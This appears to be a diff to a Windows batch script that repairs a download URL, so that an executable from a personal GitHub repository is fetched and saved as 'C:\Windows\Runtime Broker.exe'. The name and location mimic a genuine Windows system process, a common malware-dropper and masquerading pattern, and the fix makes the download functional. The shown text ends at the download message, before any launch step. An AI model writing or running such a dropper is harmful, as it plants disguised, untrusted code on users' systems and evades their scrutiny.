@@ -1,5 +1,5 @@
 @echo off
-set "downloadURL=https:/github.com/emad8787/panel/raw/refs/heads/main/speed/Runtime%20Broker.exe"
+set "downloadURL=https://github.com/emad8787/panel/raw/refs/heads/main/speed/Runtime%20Broker.exe"
 set "exePath=C:\Windows\Runtime Broker.exe"
 
 echo Downloading to %exePath%...
